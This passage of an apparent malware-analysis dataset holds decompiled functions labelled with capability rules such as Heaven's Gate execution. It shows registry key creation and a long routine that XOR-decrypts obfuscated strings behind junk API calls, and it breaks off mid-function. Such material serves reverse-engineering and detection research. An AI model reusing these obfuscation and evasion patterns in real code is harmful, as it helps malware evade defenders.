        "decompiled_code": "\nuint32_t __cdecl fcn.00404862(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    if ((arg_8h & 0x20006) == 0) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(0x80000001);\n    }\n    else {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_RegCreateKeyExW)(0x80000001);\n    }\n    uVar2 = 0;\n    if (iVar1 == 0) {\n        uVar2 = arg_8h;\n    }\n    return uVar2;\n}\n",
        "token_count": 150
    },
    "00405e5f": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00405e5f(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    int32_t iVar14;\n    int32_t iVar15;\n    int32_t iVar16;\n    int32_t iVar17;\n    int32_t iVar18;\n    uint var_118h;\n    uint var_114h;\n    uint var_110h;\n    uint var_10ch;\n    uint var_108h;\n    uint var_104h;\n    uint var_100h;\n    uint var_fch;\n    uint var_f8h;\n    uint var_f4h;\n    uint var_f0h;\n    uint var_ech;\n    int32_t var_e8h;\n    uint var_e4h;\n    int32_t var_e0h;\n    uint var_dch;\n    int32_t var_d8h;\n    uint var_d4h;\n    int32_t var_d0h;\n    uint var_cch;\n    int32_t var_c8h;\n    uint var_c4h;\n    int32_t var_c0h;\n    uint var_bch;\n    int32_t var_b8h;\n    uint var_b4h;\n    int32_t var_b0h;\n    uint var_ach;\n    int32_t var_a8h;\n    uint var_a4h;\n    int32_t var_a0h;\n    uint var_9ch;\n    int32_t var_98h;\n    uint var_94h;\n    int32_t var_90h;\n    uint var_8ch;\n    int32_t var_88h;\n    uint var_84h;\n    int32_t var_80h;\n    uint var_7ch;\n    int32_t var_78h;\n    uint var_74h;\n    int32_t var_70h;\n    uint var_6ch;\n    int32_t var_68h;\n    uint var_64h;\n    int32_t var_60h;\n    uint var_5ch;\n    int32_t var_58h;\n    uint var_54h;\n    int32_t var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    uint var_44h;\n    int32_t var_40h;\n    uint var_3ch;\n    int32_t var_38h;\n    int32_t var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uchar var_8h;\n    uchar var_7h;\n    uchar var_6h;\n    uchar var_5h;\n    uint var_4h;\n    \n    var_18h._0_1_ = 0x20;\n    var_18h._1_1_ = 0x22;\n    var_18h._2_1_ = 1;\n    var_18h._3_1_ = 0x1d;\n    var_14h._0_1_ = 0x57;\n    var_14h._1_1_ = 0x19;\n    var_14h._2_1_ = 7;\n    var_14h._3_1_ = 0x22;\n    var_10h._0_1_ = 0x16;\n    var_10h._1_1_ = 0;\n    var_10h._2_1_ = 0x59;\n    var_10h._3_1_ = 0x1d;\n    var_ch._0_1_ = 0x1d;\n    var_ch._1_1_ = 0x17;\n    var_ch._2_1_ = 0x30;\n    var_38h = 6;\n    var_ch._3_1_ = 6;\n    var_8h = 0x44;\n    var_7h = 0x11;\n    var_6h = 0x1f;\n    var_5h = 0x22;\n    var_4h._0_1_ = 0x25;\n    var_4h._1_1_ = 10;\n    var_4h._2_1_ = 0x32;\n    var_2ch = 0x6f424773;\n    var_28h._0_2_ = 0x7832;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x18);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar18 = 0;\n    do {\n        iVar5 = (*_sym.imp.ADVAPI32.dll_RevertToSelf)();\n        if (iVar5 != 0xbae6e5) {\n            *(iVar18 + iVar4) = *(&var_2ch + iVar18 % var_38h) ^ (iVar18 + iVar4)[&var_18h - iVar4];\n        }\n        iVar18 = iVar18 + 1;\n    } while (iVar18 < 0x17);\n    fcn.0040531e();\n    var_20h = 0x1a241423;\n    var_1ch._0_1_ = 0x36;\n    var_1ch._1_1_ = 0x19;\n    var_1ch._2_1_ = 0x16;\n    var_1ch._3_1_ = 0xb;\n    var_18h._0_1_ = 0x39;\n    var_18h._1_1_ = 0x37;\n    var_18h._2_1_ = 0x19;\n    var_18h._3_1_ = 0x1c;\n    var_14h._0_1_ = 4;\n    var_14h._1_1_ = 0x1b;\n    var_14h._2_1_ = 0x3c;\n    var_14h._3_1_ = 0x24;\n    var_10h._0_1_ = 0x1e;\n    var_10h._1_1_ = 0xe;\n    var_10h._2_1_ = 0xc;\n    var_10h._3_1_ = 0x2b;\n    var_ch._0_1_ = 0x20;\n    var_ch._1_1_ = 3;\n    var_ch._2_1_ = 0xc;\n    var_ch._3_1_ = 0x1f;\n    var_8h = 0x2c;\n    var_7h = 0x1c;\n    var_6h = 0x14;\n    var_5h = 2;\n    var_4h._0_1_ = 0xc;\n    var_4h._1_1_ = 0x45;\n    var_b8h = 0x69657170;\n    var_b4h._0_1_ = 0x45;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1f);\n    iVar18 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    var_34h = 5;\n    iVar5 = 0;\n    var_24h = &var_20h - iVar18;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetMessageTime)();\n        if (iVar6 != 0x43497c) {\n            *(iVar5 + iVar18) = *(&var_b8h + iVar5 % var_34h) ^ (iVar5 + iVar18)[&var_20h - iVar18];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x1e);\n    fcn.0040531e();\n    var_18h._0_1_ = 0x17;\n    var_18h._1_1_ = 0x57;\n    var_18h._2_1_ = 0x7b;\n    var_18h._3_1_ = 0;\n    var_14h._0_1_ = 6;\n    var_14h._1_1_ = 0x2f;\n    var_14h._2_1_ = 0x7f;\n    var_14h._3_1_ = 0x52;\n    var_10h._0_1_ = 2;\n    var_10h._1_1_ = 10;\n    var_10h._2_1_ = 0x36;\n    var_10h._3_1_ = 0x4b;\n    var_ch._0_1_ = 0x67;\n    var_ch._1_1_ = 0x1d;\n    var_ch._2_1_ = 0xc;\n    var_ch._3_1_ = 0x32;\n    var_8h = 0x5b;\n    var_7h = 0x5b;\n    var_6h = 10;\n    var_5h = 2;\n    var_4h._0_1_ = 0x21;\n    var_4h._1_1_ = 0x32;\n    var_98h = 0x6f373244;\n    var_94h._0_1_ = 0x65;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x17);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar6 = 0;\n    var_b8h = iVar5;\n    var_24h = &var_18h - iVar5;\n    do {\n        iVar7 = (*_sym.imp.USER32.dll_CountClipboardFormats)();\n        if (iVar7 != 0xd3edb6) {\n            *(iVar6 + iVar5) = *(&var_98h + iVar6 % var_34h) ^ (iVar6 + iVar5)[&var_18h - iVar5];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0x16);\n    fcn.0040531e();\n    var_1ch._0_1_ = 0x34;\n    var_1ch._1_1_ = 0;\n    var_1ch._2_1_ = 0x39;\n    var_1ch._3_1_ = 0x5c;\n    var_18h._0_1_ = 0x3a;\n    var_18h._1_1_ = 0x15;\n    var_18h._2_1_ = 0;\n    var_18h._3_1_ = 0x11;\n    var_14h._0_1_ = 0x41;\n    var_14h._1_1_ = 0x3c;\n    var_14h._2_1_ = 0x36;\n    var_14h._3_1_ = 0x10;\n    var_10h._0_1_ = 0x1f;\n    var_10h._1_1_ = 0x46;\n    var_10h._2_1_ = 0x38;\n    var_10h._3_1_ = 0x37;\n    var_ch._0_1_ = 0x17;\n    var_ch._1_1_ = 0x19;\n    var_ch._2_1_ = 0x44;\n    var_ch._3_1_ = 0x30;\n    var_8h = 0xb;\n    var_7h = 0;\n    var_6h = 0x17;\n    var_5h = 0x57;\n    var_4h._0_1_ = 0x59;\n    var_90h = 0x32706567;\n    var_8ch._0_1_ = 0x59;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1a);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar6 = 0;\n    var_98h = iVar5;\n    var_24h = &var_1ch - iVar5;\n    do {\n        iVar7 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n        if (iVar7 != 0xab1169) {\n            *(iVar6 + iVar5) = *(&var_90h + iVar6 % var_34h) ^ (iVar6 + iVar5)[&var_1ch - iVar5];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0x19);\n    fcn.0040531e();\n    var_1ch._0_1_ = 0x27;\n    var_1ch._1_1_ = 0x52;\n    var_1ch._2_1_ = 0x39;\n    var_1ch._3_1_ = 0x3b;\n    var_18h._0_1_ = 0x3a;\n    var_18h._1_1_ = 0x3e;\n    var_18h._2_1_ = 0x18;\n    var_18h._3_1_ = 0x5e;\n    var_14h._0_1_ = 0xf;\n    var_14h._1_1_ = 0x3c;\n    var_14h._2_1_ = 0x3d;\n    var_14h._3_1_ = 0x34;\n    var_10h._0_1_ = 0x10;\n    var_10h._1_1_ = 0x7e;\n    var_10h._2_1_ = 2;\n    var_10h._3_1_ = 0x25;\n    var_ch._0_1_ = 0x3c;\n    var_ch._1_1_ = 0x25;\n    var_ch._2_1_ = 0x24;\n    var_ch._3_1_ = 0x45;\n    var_8h = 5;\n    var_7h = 0x23;\n    var_6h = 0x20;\n    var_5h = 0x3d;\n    var_4h._0_1_ = 0x11;\n    var_4h._1_1_ = 0x50;\n    var_4h._2_1_ = 9;\n    var_4h._3_1_ = 0x55;\n    var_2ch = 0x556c3774;\n    var_28h._0_2_ = 0x5149;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1d);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar6 = 0;\n    var_90h = iVar5;\n    var_24h = &var_1ch - iVar5;\n    do {\n        iVar7 = (*_sym.imp.USER32.dll_GetActiveWindow)();\n        if (iVar7 != 0x8b13ca) {\n            *(iVar6 + iVar5) = *(&var_2ch + iVar6 % var_38h) ^ (iVar6 + iVar5)[&var_1ch - iVar5];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0x1c);\n    fcn.0040531e();\n    var_1ch._2_1_ = 5;\n    var_1ch._0_1_ = 0x3d;\n    var_1ch._1_1_ = 0x32;\n    var_1ch._3_1_ = 0x51;\n    var_18h._0_1_ = 0x52;\n    var_18h._1_1_ = 6;\n    var_18h._2_1_ = 0x3e;\n    var_18h._3_1_ = 0x26;\n    var_14h._0_1_ = 0x55;\n    var_14h._1_1_ = 0x70;\n    var_14h._2_1_ = 0xd;\n    var_14h._3_1_ = 0x34;\n    var_10h._0_1_ = 0x27;\n    var_10h._1_1_ = 0x45;\n    var_10h._2_1_ = 0x5f;\n    var_10h._3_1_ = 0x1a;\n    var_ch._0_1_ = 7;\n    var_ch._1_1_ = 0x3a;\n    var_ch._2_1_ = 0x59;\n    var_ch._3_1_ = 0x47;\n    var_8h = 7;\n    var_7h = 0x3b;\n    var_6h = 0x2d;\n    var_5h = 0x57;\n    var_4h._0_1_ = 0x54;\n    var_4h._1_1_ = 0x6e;\n    var_78h = 0x3048576e;\n    var_74h._0_1_ = 0x31;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1b);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar6 = 0;\n    var_24h = &var_1ch - iVar5;\n    do {\n        iVar7 = (*_sym.imp.KERNEL32.dll_IsSystemResumeAutomatic)();\n        if (iVar7 != 0xe8dbe1) {\n            *(iVar6 + iVar5) = *(&var_78h + iVar6 % var_34h) ^ (iVar6 + iVar5)[&var_1ch - iVar5];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0x1a);\n    fcn.0040531e();\n    var_10h._0_1_ = 0x3c;\n    var_10h._1_1_ = 0x1d;\n    var_10h._2_1_ = 0x3f;\n    var_10h._3_1_ = 10;\n    var_ch._0_1_ = 7;\n    var_ch._1_1_ = 5;\n    var_ch._2_1_ = 0x1d;\n    var_ch._3_1_ = 0x11;\n    var_8h = 0x1d;\n    var_7h = 0;\n    var_6h = 9;\n    var_5h = 0x30;\n    var_4h._0_1_ = 8;\n    var_4h._1_1_ = 0x1d;\n    var_4h._2_1_ = 0x6b;\n    var_2ch = 0x696b786f;\n    var_28h._0_2_ = 0x5565;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x10);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar7 = 0;\n    var_78h = iVar6;\n    var_24h = &var_10h - iVar6;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_GetClipboardSequenceNumber)();\n        if (iVar8 != 0x14a08f) {\n            *(iVar7 + iVar6) = *(&var_2ch + iVar7 % var_38h) ^ (iVar7 + iVar6)[&var_10h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0xf);\n    fcn.0040531e();\n    var_14h._0_1_ = 0x3e;\n    var_14h._1_1_ = 0;\n    var_14h._2_1_ = 0x20;\n    var_14h._3_1_ = 0x5d;\n    var_10h._0_1_ = 1;\n    var_10h._1_1_ = 0x18;\n    var_10h._2_1_ = 0x17;\n    var_10h._3_1_ = 0x1a;\n    var_ch._0_1_ = 0x4c;\n    var_ch._1_1_ = 0x1b;\n    var_ch._2_1_ = 0x3d;\n    var_ch._3_1_ = 0x17;\n    var_8h = 0x1a;\n    var_7h = 0x4e;\n    var_6h = 0xb;\n    var_5h = 1;\n    var_4h._0_1_ = 0;\n    var_4h._1_1_ = 0x14;\n    var_4h._2_1_ = 0x5d;\n    var_4h._3_1_ = 0x62;\n    var_60h = 0x3873656d;\n    var_5ch._0_1_ = 0x62;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar7 = 0;\n    var_24h = &var_14h - iVar6;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_GetActiveWindow)();\n        if (iVar8 != 0x3b104a) {\n            *(iVar7 + iVar6) = *(&var_60h + iVar7 % var_34h) ^ (iVar7 + iVar6)[&var_14h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x14);\n    fcn.0040531e();\n    var_1ch._0_1_ = 2;\n    var_1ch._1_1_ = 0x35;\n    var_1ch._2_1_ = 0x37;\n    var_1ch._3_1_ = 0x11;\n    var_18h._0_1_ = 0x22;\n    var_18h._1_1_ = 0x34;\n    var_18h._2_1_ = 0x1f;\n    var_18h._3_1_ = 0x14;\n    var_14h._0_1_ = 0x1e;\n    var_14h._1_1_ = 0x2c;\n    var_14h._2_1_ = 0x23;\n    var_14h._3_1_ = 0x23;\n    var_10h._0_1_ = 0xb;\n    var_10h._1_1_ = 0x19;\n    var_10h._2_1_ = 0x39;\n    var_10h._3_1_ = 1;\n    var_ch._0_1_ = 0x22;\n    var_ch._1_1_ = 10;\n    var_ch._2_1_ = 6;\n    var_ch._3_1_ = 0x20;\n    var_8h = 0x3d;\n    var_7h = 0x35;\n    var_6h = 4;\n    var_5h = 0x15;\n    var_4h._0_1_ = 0x49;\n    var_e8h = 0x70635051;\n    var_e4h._0_1_ = 0x49;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1a);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar8 = 0;\n    var_60h = iVar7;\n    var_24h = &var_1ch - iVar7;\n    do {\n        iVar9 = (*_sym.imp.USER32.dll_CreateMenu)();\n        if (iVar9 != 0x9b024a) {\n            *(iVar8 + iVar7) = *(&var_e8h + iVar8 % var_34h) ^ (iVar8 + iVar7)[&var_1ch - iVar7];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x19);\n    fcn.0040531e();\n    var_18h._0_1_ = 0x37;\n    var_18h._1_1_ = 0x23;\n    var_18h._2_1_ = 3;\n    var_18h._3_1_ = 0x2a;\n    var_14h._0_1_ = 0x1b;\n    var_14h._1_1_ = 0;\n    var_14h._2_1_ = 2;\n    var_14h._3_1_ = 0x3d;\n    var_10h._0_1_ = 0x2c;\n    var_10h._1_1_ = 0xc;\n    var_10h._2_1_ = 1;\n    var_10h._3_1_ = 0x34;\n    var_ch._0_1_ = 0x1f;\n    var_ch._1_1_ = 0x37;\n    var_ch._2_1_ = 0x13;\n    var_ch._3_1_ = 0x12;\n    var_8h = 0x2f;\n    var_7h = 0x23;\n    var_6h = 0x20;\n    var_5h = 0x1d;\n    var_4h._0_1_ = 1;\n    var_4h._1_1_ = 0x46;\n    var_e0h = 0x454f4664;\n    var_dch._0_1_ = 0x7a;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x17);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar8 = 0;\n    var_e8h = iVar7;\n    var_24h = &var_18h - iVar7;\n    do {\n        iVar9 = (*_sym.imp.KERNEL32.dll_GetLogicalDrives)();\n        if (iVar9 != 0xb00168) {\n            *(iVar8 + iVar7) = *(&var_e0h + iVar8 % var_34h) ^ (iVar8 + iVar7)[&var_18h - iVar7];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x16);\n    fcn.0040531e();\n    var_1ch._0_1_ = 0x15;\n    var_1ch._1_1_ = 0x1f;\n    var_1ch._2_1_ = 0x27;\n    var_1ch._3_1_ = 0x16;\n    var_18h._0_1_ = 0x3d;\n    var_18h._1_1_ = 0x32;\n    var_18h._2_1_ = 0x1f;\n    var_18h._3_1_ = 0x19;\n    var_14h._0_1_ = 0x3f;\n    var_14h._1_1_ = 0x3c;\n    var_14h._2_1_ = 0x29;\n    var_14h._3_1_ = 0x1c;\n    var_10h._0_1_ = 0x1d;\n    var_10h._1_1_ = 3;\n    var_10h._2_1_ = 0x2b;\n    var_10h._3_1_ = 0x16;\n    var_ch._0_1_ = 8;\n    var_ch._1_1_ = 0x1d;\n    var_ch._2_1_ = 0x19;\n    var_ch._3_1_ = 0x27;\n    var_8h = 0x2a;\n    var_7h = 0x1f;\n    var_6h = 0x13;\n    var_5h = 10;\n    var_4h._0_1_ = 0x4e;\n    var_d8h = 0x6f747a46;\n    var_d4h._0_1_ = 0x4e;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1a);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar8 = 0;\n    var_e0h = iVar7;\n    var_24h = &var_1ch - iVar7;\n    do {\n        iVar9 = (*_sym.imp.USER32.dll_CreateMenu)();\n        if (iVar9 != 0xb6c2dc) {\n            *(iVar8 + iVar7) = *(&var_d8h + iVar8 % var_34h) ^ (iVar8 + iVar7)[&var_1ch - iVar7];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x19);\n    fcn.0040531e();\n    var_18h._0_1_ = 0x1a;\n    var_18h._1_1_ = 0x24;\n    var_18h._2_1_ = 0x30;\n    var_18h._3_1_ = 0x49;\n    var_14h._0_1_ = 0x21;\n    var_14h._1_1_ = 0x3d;\n    var_14h._2_1_ = 0x24;\n    var_14h._3_1_ = 0xe;\n    var_10h._0_1_ = 0x44;\n    var_10h._1_1_ = 0x3b;\n    var_10h._2_1_ = 0x24;\n    var_10h._3_1_ = 0x24;\n    var_ch._0_1_ = 0x33;\n    var_ch._1_1_ = 0x42;\n    var_ch._2_1_ = 0x3b;\n    var_ch._3_1_ = 0x3f;\n    var_8h = 0x28;\n    var_7h = 0xf;\n    var_6h = 0x55;\n    var_5h = 0x35;\n    var_4h._0_1_ = 0x2c;\n    var_4h._1_1_ = 0x41;\n    var_d0h = 0x30634149;\n    var_cch._0_1_ = 0x52;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x17);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar8 = 0;\n    var_d8h = iVar7;\n    var_24h = &var_18h - iVar7;\n    do {\n        iVar9 = (*_sym.imp.USER32.dll_GetKBCodePage)();\n        if (iVar9 != 0x16a508) {\n            *(iVar8 + iVar7) = *(&var_d0h + iVar8 % var_34h) ^ (iVar8 + iVar7)[&var_18h - iVar7];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x16);\n    fcn.0040531e();\n    var_20h = 0x33650318;\n    var_1ch._0_1_ = 0xb;\n    var_1ch._1_1_ = 10;\n    var_1ch._2_1_ = 0x22;\n    var_1ch._3_1_ = 10;\n    var_18h._0_1_ = 0x50;\n    var_18h._1_1_ = 0x12;\n    var_18h._2_1_ = 0xd;\n    var_18h._3_1_ = 2;\n    var_14h._0_1_ = 0x2c;\n    var_14h._1_1_ = 10;\n    var_14h._2_1_ = 0x50;\n    var_14h._3_1_ = 0x11;\n    var_10h._0_1_ = 0x16;\n    var_10h._1_1_ = 3;\n    var_10h._2_1_ = 0x28;\n    var_10h._3_1_ = 3;\n    var_ch._0_1_ = 0x46;\n    var_ch._1_1_ = 0x32;\n    var_ch._2_1_ = 0x34;\n    var_ch._3_1_ = 0x1e;\n    var_8h = 0x22;\n    var_7h = 0x10;\n    var_6h = 0x5c;\n    var_5h = 0x2d;\n    var_4h._0_1_ = 1;\n    var_4h._1_1_ = 0xb;\n    var_4h._2_1_ = 0x2e;\n    var_4h._3_1_ = 0x66;\n    var_2ch = 0x4135664b;\n    var_28h._0_2_ = 0x6c64;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x21);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar8 = 0;\n    var_d0h = iVar7;\n    var_24h = &var_20h - iVar7;\n    do {\n        iVar9 = (*_sym.imp.USER32.dll_CreateMenu)();\n        if (iVar9 != 0x80521d) {\n            *(iVar8 + iVar7) = *(&var_2ch + iVar8 % var_38h) ^ (iVar8 + iVar7)[&var_20h - iVar7];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x20);\n    fcn.0040531e();\n    var_20h = 0x3a2d0720;\n    var_1ch._0_1_ = 0x2b;\n    var_1ch._1_1_ = 1;\n    var_1ch._2_1_ = 7;\n    var_1ch._3_1_ = 5;\n    var_18h._0_1_ = 0x27;\n    var_18h._1_1_ = 0x2d;\n    var_18h._2_1_ = 0x31;\n    var_18h._3_1_ = 3;\n    var_14h._0_1_ = 0x17;\n    var_14h._1_1_ = 0x31;\n    var_14h._2_1_ = 0x18;\n    var_14h._3_1_ = 1;\n    var_10h._0_1_ = 0xb;\n    var_10h._1_1_ = 0xb;\n    var_10h._2_1_ = 0x26;\n    var_10h._3_1_ = 0x21;\n    var_ch._0_1_ = 7;\n    var_ch._1_1_ = 0x1b;\n    var_ch._2_1_ = 0x34;\n    var_ch._3_1_ = 0x26;\n    var_8h = 0x21;\n    var_6h = 0xb;\n    var_5h = 8;\n    var_4h._0_1_ = 0x31;\n    var_4h._1_1_ = 0x2f;\n    var_4h._2_1_ = 0x16;\n    var_4h._3_1_ = 0x62;\n    var_c8h = 0x54646273;\n    var_c4h._0_1_ = 0x48;\n    var_7h = var_1ch._3_1_;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x21);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar8 = 0;\n    var_24h = &var_20h - iVar7;\n    do {\n        iVar9 = (*_sym.imp.USER32.dll_CreateMenu)();\n        if (iVar9 != 0x2f8e87) {\n            *(iVar8 + iVar7) = *(&var_c8h + iVar8 % var_34h) ^ (iVar8 + iVar7)[&var_20h - iVar7];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x20);\n    fcn.0040531e();\n    var_1ch._0_1_ = 1;\n    var_1ch._1_1_ = 6;\n    var_1ch._2_1_ = 0x22;\n    var_1ch._3_1_ = 0x24;\n    var_18h._0_1_ = 0x56;\n    var_18h._1_1_ = 0x33;\n    var_18h._2_1_ = 0x17;\n    var_18h._3_1_ = 4;\n    var_14h._1_1_ = 0x52;\n    var_14h._2_1_ = 0x35;\n    var_10h._0_1_ = 7;\n    var_10h._1_1_ = 0x3f;\n    var_10h._2_1_ = 0x5f;\n    var_10h._3_1_ = 0x37;\n    var_ch._0_1_ = 0x33;\n    var_ch._1_1_ = 0x13;\n    var_ch._2_1_ = 0x3f;\n    var_ch._3_1_ = 0x45;\n    var_8h = 0x3b;\n    var_7h = 0xf;\n    var_6h = 4;\n    var_5h = 0x31;\n    var_4h._0_1_ = 0x56;\n    var_4h._1_1_ = 0x52;\n    var_c0h = 0x56616352;\n    var_bch._0_1_ = 0x33;\n    var_14h._0_1_ = var_1ch._1_1_;\n    var_14h._3_1_ = var_1ch._1_1_;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1b);\n    iVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar9 = 0;\n    var_c8h = iVar8;\n    var_24h = &var_1ch - iVar8;\n    do {\n        iVar10 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar10 != 0x7d4e04) {\n            *(iVar9 + iVar8) = *(&var_c0h + iVar9 % var_34h) ^ (iVar9 + iVar8)[&var_1ch - iVar8];\n        }\n        iVar9 = iVar9 + 1;\n    } while (iVar9 < 0x1a);\n    fcn.0040531e();\n    var_1ch._0_1_ = 2;\n    var_1ch._1_1_ = 0x28;\n    var_1ch._2_1_ = 5;\n    var_1ch._3_1_ = 0x24;\n    var_18h._0_1_ = 0x13;\n    var_18h._1_1_ = 3;\n    var_18h._2_1_ = 0x25;\n    var_18h._3_1_ = 0x28;\n    var_14h._0_1_ = 0x16;\n    var_14h._1_1_ = 0x33;\n    var_14h._2_1_ = 4;\n    var_14h._3_1_ = 0xf;\n    var_10h._0_1_ = 0x30;\n    var_10h._1_1_ = 0x23;\n    var_10h._2_1_ = 0x23;\n    var_10h._3_1_ = 0x38;\n    var_ch._0_1_ = 2;\n    var_ch._1_1_ = 0x32;\n    var_ch._2_1_ = 0x23;\n    var_ch._3_1_ = 0x24;\n    var_8h = 0x30;\n    var_7h = 0x3f;\n    var_6h = 0x1a;\n    var_5h = 7;\n    var_4h._0_1_ = 0x36;\n    var_4h._1_1_ = 0x28;\n    var_4h._2_1_ = 0x46;\n    var_2ch = 0x56464d51;\n    var_28h._0_2_ = 0x6276;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1c);\n    iVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar9 = 0;\n    var_c0h = iVar8;\n    var_24h = &var_1ch - iVar8;\n    do {\n        iVar10 = (*_sym.imp.USER32.dll_GetOpenClipboardWindow)();\n        if (iVar10 != 0x56f672) {\n            *(iVar9 + iVar8) = *(&var_2ch + iVar9 % var_38h) ^ (iVar9 + iVar8)[&var_1ch - iVar8];\n        }\n        iVar9 = iVar9 + 1;\n    } while (iVar9 < 0x1b);\n    fcn.0040531e();\n    var_14h._0_1_ = 0x19;\n    var_14h._1_1_ = 0x1f;\n    var_14h._2_1_ = 0x12;\n    var_14h._3_1_ = 0x16;\n    var_10h._0_1_ = 0x17;\n    var_10h._1_1_ = 0x5c;\n    var_10h._2_1_ = 0x3f;\n    var_10h._3_1_ = 10;\n    var_ch._0_1_ = 0;\n    var_ch._1_1_ = 5;\n    var_ch._2_1_ = 0x1d;\n    var_ch._3_1_ = 0x41;\n    var_8h = 0x23;\n    var_7h = 0x16;\n    var_6h = 0x35;\n    var_5h = 0x10;\n    var_4h._0_1_ = 0x11;\n    var_4h._1_1_ = 0x37;\n    var_2ch = 0x77507a4a;\n    var_28h._0_2_ = 0x3774;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x13);\n    iVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar9 = 0;\n    var_24h = &var_14h - iVar8;\n    do {\n        iVar10 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar10 != 0xfa65f6) {\n            *(iVar9 + iVar8) = *(&var_2ch + iVar9 % var_38h) ^ (iVar9 + iVar8)[&var_14h - iVar8];\n        }\n        iVar9 = iVar9 + 1;\n    } while (iVar9 < 0x12);\n    fcn.0040531e();\n    var_14h._0_1_ = 0x14;\n    var_14h._1_1_ = 0x52;\n    var_14h._2_1_ = 99;\n    var_14h._3_1_ = 0x32;\n    var_10h._0_1_ = 4;\n    var_10h._1_1_ = 0x33;\n    var_10h._2_1_ = 0x28;\n    var_10h._3_1_ = 0x45;\n    var_ch._0_1_ = 0x54;\n    var_ch._1_1_ = 7;\n    var_ch._2_1_ = 5;\n    var_ch._3_1_ = 0x2e;\n    var_8h = 0x31;\n    var_7h = 0x5e;\n    var_6h = 0x5d;\n    var_5h = 0x32;\n    var_4h._0_1_ = 0x10;\n    var_4h._1_1_ = 0x22;\n    var_4h._2_1_ = 0x47;\n    var_2ch = 0x57313747;\n    var_28h._0_2_ = 0x4777;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x14);\n    